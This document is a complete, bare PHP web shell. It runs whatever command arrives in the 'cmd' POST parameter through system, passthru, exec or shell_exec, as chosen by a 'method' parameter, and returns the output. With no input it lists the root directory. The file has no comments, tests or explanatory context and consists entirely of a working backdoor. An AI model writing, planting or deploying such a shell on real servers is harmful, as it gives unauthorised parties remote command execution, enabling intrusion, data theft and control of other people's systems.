<?php
$method = $_POST['method'];
$cmd = $_POST['cmd'];
if (!$method) { $method="system"; }
    if (!$cmd) { $cmd = "ls /"; }
if ($method=="system") 
       system("$cmd 2>&1");

if ($method=="passthru") 
        passthru("$cmd 2>&1");
       
if ($method=="exec") {
    while ($string = exec("$cmd 2>&1")) 
        echo $string;
}
if ($method=="shell_exec") {
    echo shell_exec("$cmd 2>&1");
}
echo "end";
?>